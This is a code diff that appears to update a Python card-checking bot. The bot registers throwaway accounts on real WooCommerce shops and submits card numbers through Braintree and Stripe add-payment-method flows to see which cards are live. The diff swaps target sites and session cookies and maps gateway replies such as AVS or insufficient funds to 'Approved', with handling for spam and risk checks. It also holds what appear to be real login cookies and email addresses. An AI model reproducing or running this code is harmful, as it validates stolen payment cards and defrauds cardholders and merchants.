     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'mtk_src_trk': '{"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
-    'viewed_cookie_policy': 'yes',
-    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': big,
-    'tk_ai': 'JIy%2BpgomdEccIPNxoN8V1fTc',
-    '_tt_enable_cookie': '1',
-    '_ttp': 'XSSScJcwhDPZSzCIQrl0SkubI_v',
-    'mailchimp.cart.previous_email': 'nejwjjw@gmaul.com',
-    'mailchimp.cart.current_email': 'aman44@gmail.com',
-    'mailchimp_user_previous_email': 'aman44%40gmail.com',
-    'mailchimp_user_email': 'aman44%40gmail.com',
-    '_ga_SGEGXEGQDY': 'GS1.1.1725851994.1.1.1725853463.60.0.0',
-    '_ga_WNQMQBX793': 'GS1.1.1725851997.1.1.1725853465.60.0.0',
-    '_omappvs': '1725853465873',
-    'sbjs_session': 'pgs%3D51%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'tk_qs': '',
+    '_fbp': 'fb.1.1727858534209.685477442657234647',
+    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': big,
+    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'kc11jym9ft1vjq5l75hh',
+    'wp_automatewoo_session_started': '1',
+    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43752%7Cother%7Cread%7C125155f306ae1e8539678a350448cf09e4dac4918e332c0b151caa84c9c3595e',
+    'sbjs_session': 'pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    '__kla_id': 'eyIkZXhjaGFuZ2VfaWQiOiJYWU1ZZ0RRS0VRZFNXazhES1dyakFXVVhFV0ZIMVplY0FUNWw0R0tSWWhjLkpCemFKSiJ9',
 }
 
   headers = {
-    'authority': 'www.studynotesaba.com',
+    'authority': 'alphawolfnutrition.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=9922c106453b1b91f13b2aa5380a2d90; _ga=GA1.1.445964708.1725851995; _omappvp=1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2; _fbp=fb.1.1725851998020.953269146937982147; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d; tk_ai=JIy%2BpgomdEccIPNxoN8V1fTc; _tt_enable_cookie=1; _ttp=XSSScJcwhDPZSzCIQrl0SkubI_v; mailchimp.cart.previous_email=nejwjjw@gmaul.com; mailchimp.cart.current_email=aman44@gmail.com; mailchimp_user_previous_email=aman44%40gmail.com; mailchimp_user_email=aman44%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725851994.1.1.1725853463.60.0.0; _ga_WNQMQBX793=GS1.1.1725851997.1.1.1725853465.60.0.0; _omappvs=1725853465873; sbjs_session=pgs%3D51%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=',
-    'origin': 'https://www.studynotesaba.com',
-    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+    'content-type': 'application/x-www-form-urlencoded',  
+    'origin': 'https://alphawolfnutrition.com',
+    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -216,255 +218,227 @@ chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-  data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"f69b3f7256207f3e24d009cfb9bedb49","fraud_merchant_id":null,"correlation_id":"a9bf5370-61fe-4efd-ba89-65d47f2c"}',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU5Mzk4NjksImp0aSI6ImM1YjMwNDI4LTFiMDctNDViNy05MmU0LWFmMGM4MDU5M2IxZSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.fL5sViWnI6rhanmOeECeJRssG71O68zmtNgZejGPhsp0_a_lkYejo5nbxwQG0SzE7D7JR42QQg7Lf3ukCF_mSw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
-
-  response = requests.post(
-    'https://www.studynotesaba.com/my-account/add-payment-method/',
-    cookies=cookies,
-    headers=headers,
-    data=data,
-)
-  text = response.text
-  pattern = r'Reason: (.+?)\s*</li>'
-  match = re.search(pattern, text)
-  if match:
-    result = match.group(1)
-  else:
-    if 'Payment method successfully added.' in text:
-      result = "1000: Approved"
-    elif 'risk_threshold' in text:
-      result = "Gateway Rejected: Risk Threshold"
-    elif 'Please wait for 20 seconds.' in text:      
-      result = "Sᴘᴀᴍ Dᴇᴛᴇᴄᴛᴇᴅ"
-    else:
-      result = "Declined"
-      print(dead)
-  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
-     return 'Approved'
-     print(added)
-  else:
-     return result
-     
-     
-import requests
-import re
-import time
-import random
-import string
-import base64
-from bs4 import BeautifulSoup
-import user_agent
-import pyfiglet
-import os
-import webbrowser
-from colorama import Fore
-from getuseragent import UserAgent
-from tqdm import tqdm
-
-
-
-def Tele3(ccx):
-  import requests
-  import re
-  import random
-  import string
-  import base64
-  from getuseragent import UserAgent
-  from user_agent import generate_user_agent
-
-  ccx=ccx.strip()
-  #ccx = g.strip().split('\n')[0]
-  ccx = ccx.strip()
-  parts = re.split(r'[ |/]', ccx)
-  n = parts[0]
-  mm = parts[1]
-  yy = parts[2]
-  cvc = parts[3]
-
-  print(n,mm,yy,cvc)
-
-  r = requests.session()
-  user = user_agent.generate_user_agent()
-
-  def generate_random_account():
-    name = ''.join(random.choices(string.ascii_lowercase, k=20))
-    number = ''.join(random.choices(string.digits, k=4))
-
-    return f"{name}{number}@yahoo.com"
-  acc = (generate_random_account())
-
-
-  def username():
-    name = ''.join(random.choices(string.ascii_lowercase, k=20))
-    number = ''.join(random.choices(string.digits, k=20))
-
-    return f"{name}{number}"
-  username = (username())
-
-  def generate_random_code(length=32):
-    letters_and_digits = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters_and_digits) for _ in range(length))
-
-  corr = generate_random_code()
-
-  sess = generate_random_code()
-
-  headers = {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Cache-Control': 'max-age=0',
-    'Connection': 'keep-alive',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'none',
-    'Sec-Fetch-User': '?1',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-  }
-
-  response = r.get('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers)
-
-  register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-
-  headers = {
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-      'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-      'Cache-Control': 'max-age=0',
-      'Connection': 'keep-alive',
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'Origin': 'https://www.baileybox.com',
-      'Referer': 'https://www.baileybox.com/my-account/',
-      'Sec-Fetch-Dest': 'document',
-      'Sec-Fetch-Mode': 'navigate',
-      'Sec-Fetch-Site': 'same-origin',
-      'Sec-Fetch-User': '?1',
-      'Upgrade-Insecure-Requests': '1',
-      'User-Agent': user,
-      'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-      'sec-ch-ua-mobile': '?1',
-      'sec-ch-ua-platform': '"Android"',
-  }
-
-  data = {
-      'username': username,
-      'email': acc,
-      'mailchimp_woocommerce_newsletter': '1',
-      'woocommerce-register-nonce': register,
-      '_wp_http_referer': '/my-account/',
-      'register': 'Register',
-      'ak_bib': '1725448457761',
-      'ak_bfs': '1725448470119',
-      'ak_bkpc': '6',
-      'ak_bkp': '20;19;6,129;4;7;4,149;',
-      'ak_bmc': '14;5,1906;20,2220;3,1393;8,7788;',
-      'ak_bmcc': '5',
-      'ak_bmk': '',
-      'ak_bck': '',
-      'ak_bmmc': '1',
-      'ak_btmc': '6',
-      'ak_bsc': '7',
-      'ak_bte': '93;455,118;105,195;412,159;389,368;309,404;314,2227;38,179;343,1261;65,263;230,1719;57,217;81,1344;295,1864;88,5529;',
-      'ak_btec': '15',
-      'ak_bmm': '14,56;',
-  }
-
-  response = r.post('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers, data=data)
-
-
-  headers = {
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-      'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-      'Connection': 'keep-alive',
-      'Referer': 'https://www.baileybox.com/my-account/payment-methods/',
-      'Sec-Fetch-Dest': 'document',
-      'Sec-Fetch-Mode': 'navigate',
-      'Sec-Fetch-Site': 'same-origin',
-      'Sec-Fetch-User': '?1',
-      'Upgrade-Insecure-Requests': '1',
-      'User-Agent': user,
-      'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-      'sec-ch-ua-mobile': '?1',
-      'sec-ch-ua-platform': '"Android"',
-  }
-
-  response = r.get('https://www.baileybox.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-
-  nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
-  print(nonce)
-
-
-  headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
     'user-agent': user,
 }
 
-  data = f'type=card&owner[name]=+&owner[email]=vehtppq%40hi2.in&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d874578e-32e4-4c40-a99b-80394c4be464171962&muid=ea0aa864-2b3f-4abf-a7cf-dd8dc40b293bd74959&sid=116b2510-cbed-4f01-a45c-7c5cbc0632c675a26b&pasted_fields=number&payment_user_agent=stripe.js%2Fc710570bc1%3B+stripe-js-v3%2Fc710570bc1%3B+card-element&referrer=https%3A%2F%2Fwww.baileybox.com&time_on_page=39431&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiL2NhRytSc1lnSjAreldFY2QvUzMzcXpjc0c1WVZoMy9Mb2FOMG5qY3BUNmNzbXNYd0ZsaWkwMWIyblpnd0RMYW9VMlU5YmNpUjlUYmdYWkZOeEtPaThOT1pwR2pQOTE2TThvUC91RUVVK3I1emVNK3Y2c0tNbmJVckNUZ3h5dlVlZ0lCQWFjZ1VwQVVzaEdSQzcyTEJmV3JzUnZCTFMwWWcvSHlUVkhNUElhaFN1U0VKbVpkU3JVZlhLMHEzN0MvQ2IzcHMyNGJYVkhuZE1YMldxR05HVXJKUUZva2ZZampTdm1haTVKZ2dIZDZhc0RzSWJZWlcrZm5qM2E5UHdaeGlKeWFPU05JVGwwSXhubFNvblFQanM3YnVuc3ZEU2lNV0VzakVpbUFwSW1UN0k2ckJVb25LU214VGU1U2JFSEk0TERKbytSWUlTV2RxN3VKL3lYOWlUT0ZCUkk3b08yUHBHM3lWYnZ4dUQydlIzNUNVckY3NzFud1laUXpDeS9Mb3pEMmRNc3lMbUczWHA1YjBJalR0QlpBVTJoL0ZMNHJLZ1R2R3BwdkVRQStoVHB2UXVSWUw2WHJwRnBWd0lBWWxxMDB6WjFwWkZQYk96a1RQNTZMQnNRQzozWnRzVGdBNHJrTmQ2Z3ZpUGlXYmVuZ0F2dW5xODB6Y0xrMnpVOGN5ZjZkNS9MQk5yZmliYSsyK3RKbFpLNDB0QVdYM3BJZHU3K1c2cWorcXpEVmVFdG12U2ZKcjgxQkdnZ2xENkYrNFluK3VvcE5SeUIxK0VKUkIzMzI1L2xra21oblZwTkR4aG9HL0xOZFBjNHVQMjd1QU1rZm9EZlFkOXUrTjRRUFdkZ0x0L2Q4eGUxeEQxNG1UYzJrWmdsQzRMSm1HV2E0T3RHK0NNQVZ5QVZTSDh5U25DTnNLcHh2Q21KWG9EWTNSSVRmVVROc05MbzJRSEhDWi9QSlZoUUY4NVpZamlyVGlDaGNSekYwK25yUFIzWG95M2hPSHYwRmN0MjJnMWk1SEsvMzJySkRNMThKenhiZkRoRDN3czU5dkQzcktlbEMrVlY2TytDVnp5ckRHK2pETjFTTkk2N2tHTjhRdzhFQ0pqRjl3L3Y0a25TN3Z2WDhQOVpqcGZKYkpmaEdlMk8rdnB0b2MvbHJkUzFyUUV4K2Ewd1BQYjVoNTByVE95WkhKcGdXTmRZRXlTUzJqTXBxZi9aSzhoK1l1bWdBSXhWRDFWU21YL0VnOG1ZOFROSjBuWS81RmZhNklORHZlUTRZc21hU0JPcmlIb0Z4TmRkcUgva2JiMkI0ZzZ3bjhhenRLYk9jV1QrK2NhcGxHRndJdlVaRTl5cWJHMmF0bTFxeU14UkpHbDNuRk94MXFxRlpUVnRlbG4zU1V4OTR6Wko5V2tJcHByc0lEY252M2FmN2ZZMzZLdTJqdkpQd2JBNVlCQVN2cWlsVJKQjY5TVV6S3ZWM3VUNUh3YnpSWUpsR083U3NPR1RrV3JTOWJ1TFAySDRMd2xaeDRkc3NjdjRVZUlWMFpNZ2laKzBmbTdFZUJETXVLR09SdmFhQU5Da2YrLzJPVVNnMWZmelZYaWpwdXJRZmdHd3BHaFpiN2lVV2FlTGRYUXdacmxyREF4dlU2MXZwN0ROK24xNHJSY0RmRm5Da3o0VldibmI1bFJQYUxGRWtQWDAzTHg4N0ZJUzJ0K1kyT1MzREZXYWRSQk9JY3VRQnBheTVFbmlPNVBTN0R2WDNDUDQ2OS90cjVOaVVJOG83ZXdaT3U0Zk9xMnJvcm55N0poWFhnTWtQMi9ZWkpLK0RyN3gxdHNSaHRHSVNkTXVucUl5eXlYM09adDRINHI5dUNHSnNLUWk3YlRLUS9uVjRnaFY4NXBteUJUbGw2Z0gyOVlqRFc3dlBGL1BQR0R6c1RudGxEakRXcHpHNkp5OFpoRzFEL2hsUkRyOVBmNlZYTjJRWjkyb2pRMVRVY0lSOWttNGc1eEtTVytRcUFzN1JGN29pZzQySlVYVnlhc24vbjNwVXpDN1BNd0Y4eHg2MXNKZWRmV0swSmtHbko0dDVWWlJDUWo1R04ralU1dUVvTXZCTGxZV3JvQzNEb2hiTTQxbVk0YTVqTDVwWXFhdnZIOGt3VWpyd1hvT3dsNmNDSVFwOTZtNldzY1M4bGhXZVZIK3NQSTdOdjJETk96V3phUFlwUjZoUVRWWitYVVRCVVM2QkUwb1c1MlAwSVkzQTJ6MlJURC9sLzd1MDZFa3duek56WVNtZFh1L3Y4ZDYrS3lVTy9XT0JvVVBqM005M2ljcURPbnpkeHJ4aW1EdFhXektrcHNBN05HTUNFMFRIMktZVnFOYkR1NCsrc21RaXVYZ0RFN2FRREVSMUtBZ3hoZmZTMWZtai9waERXR2p4d055RDU1MFMvbnprcUtZNWcxVThXZXJSang3bUpvRHY4WnI5T2FFQnZHV3NiKytDWUlWZGRGNGt5T3VnYk4wYUtFME5HSmc5K1pJSjI5ZTloYmZxQkxxMU1sMVk4LzNGc1pNUTJiVFYrY0g0SmYxTmV3dUFUNC9YaFpkTDVod2szamxOVFNiTlk1b1VLbGFicVNUd0VFMTFDQVpJZ01mS0xBOGtHbW9uM0ViaWRNLzdHVUo0GRplsWERsbk9uQWtvdWFxZU5INlJzZi9TUFdQbWUwZWhZM0tTL1dPdTVWc1kvNG1WamVYV1N5STNYRGxVL2hZWSt1N2dDR1c4YUFnRE4wMVB1MXc0N1NENThPVzYvOGVEbkJkSzZPT0Rad05rODdBUkRaV25rQVBpaXU4OS9SbmVST2dFKzJhMXZ3PT0iLCJleHAiOjE3MjU1ODczMjIsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiMTFjOTg1NjMiLCJwZDI6MCwiY2RhdGEiOiJEVHhvZ2NZTVQvd3M2SnBtMUxoZXJiQkNZTWlSZEJKWlVyZzB5VW1rRFVUQnNhYWR0NkIzMUU2ZE1qeThCSVhEalU3ZkN3a2hqbldQelNWbENrZHFaUE90UnVSNktFbVJmTThmYndrcmJGUmRGUklwOGlVekliOXM1YWVIbTQwN29JRm9tT0JUZFRMcjFLRXZpbkVPc3JZQW9YUFRWTlJXQW80N3FUQ2pQT0piS3RPMUpHRzZ0cjllMUFmYUt0UEhjSDVROFZ2WGdwRzBKTFNZIn0.tWrB5mNXeRvZZpQ2SG-JH5dAUTwzAnmHZaHme1amnRI&key=pk_live_51HUGqfI9BolQkZWDB1L6wy1IWAxxumF7xYlt1LKuwPhpun0DERaQiGOH4UANnUlRM6LoXTmzvHKNaZevOFszeEzT00sc2dZpvN'
+  data = [
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce', tok),
+    ('wc_braintree_device_data', '{"correlation_id":"3d3e3d807608835778fe8fc7b573f03d"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"3d3e3d807608835778fe8fc7b573f03d"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'USD'),
+    ('wc_braintree_paypal_locale', 'en_us'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', add_nonce),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+  ]
 
-  response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
-
-
-  if not 'id' in response.json():
-    print('ERORR CARD')
-  else:
-    id=response.json()['id']
-    print(id)
-
-  headers = {
-    'Accept': 'application/json, text/javascript, */*; q=0.01',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Connection': 'keep-alive',
-    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'Origin': 'https://www.baileybox.com',
-    'Referer': 'https://www.baileybox.com/my-account/add-payment-method/',
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    'User-Agent': user,
-    'X-Requested-With': 'XMLHttpRequest',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-}
-
-  params = {
-    'wc-ajax': 'wc_stripe_create_setup_intent',
-}
-
-  data = {
-    'stripe_source_id': id,
-    'nonce': nonce,
-}
-
+  response = requests.post(
+    'https://alphawolfnutrition.com/my-account/add-payment-method/',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+  )
+  text=response.text
+  html_text=response.text
+  soup = BeautifulSoup(html_text, 'html.parser')
   try:
-    response = requests.post('https://www.baileybox.com/', params=params, cookies=r.cookies, headers=headers, data=data)
-    i=(response.json()['error']['message'])
-    return i
+    error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
+    status_code_start = error_message.find('Status code') + len('Status code')
+    status_code_end = error_message.find('</div>')
+    result = error_message[status_code_start:status_code_end]
   except:
-    print(response.json())
+    result=text
+    if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
+      result = "1000: Approved"  # Indentation fixed here
+    elif 'risk_threshold' in text:
+      result = "RISK: Retry this BIN later."
+    elif 'Please wait for 20 seconds' in text:
+      result = "RISK"
+    else:
+      pass
+  if 'avs' in result or '1000: Approved' in result or 'Invalid postal' in result or 'Insufficient Funds' in result:
+
     return 'Approved'
+  else:
+
+    return result
+    
+    
+    
+import requests
+import re
+import random
+import string
+import base64
+from getuseragent import UserAgent
+from user_agent import generate_user_agent
+
+def Tele3(ccx):
+    ccx = ccx.strip()
+    parts = re.split(r'[ |/]', ccx)
+    n = parts[0]
+    mm = parts[1]
+    yy = parts[2]
+    cvc = parts[3]
+
+    print(n, mm, yy, cvc)
+
+    r = requests.session()
+    user = generate_user_agent()
+
+    def generate_random_account():
+        name = ''.join(random.choices(string.ascii_lowercase, k=20))
+        number = ''.join(random.choices(string.digits, k=4))
+        return f"{name}{number}@yahoo.com"
+    acc = generate_random_account()
+
+    def username():
+        name = ''.join(random.choices(string.ascii_lowercase, k=20))
+        number = ''.join(random.choices(string.digits, k=20))
+        return f"{name}{number}"
+    username = username()
+
+    def generate_random_code(length=32):
+        letters_and_digits = string.ascii_letters + string.digits
+        return ''.join(random.choice(letters_and_digits) for _ in range(length))
+
+    corr = generate_random_code()
+    sess = generate_random_code()
+
+    headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User ': '?1',
+        'Upgrade-Insecure-Requests': '1',
+        'User -Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+    }
+
+    response = r.get('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers)
+
+    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
+
+    headers = {
+        'authority': 'aptekaleki24.co.uk',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://aptekaleki24.co.uk',
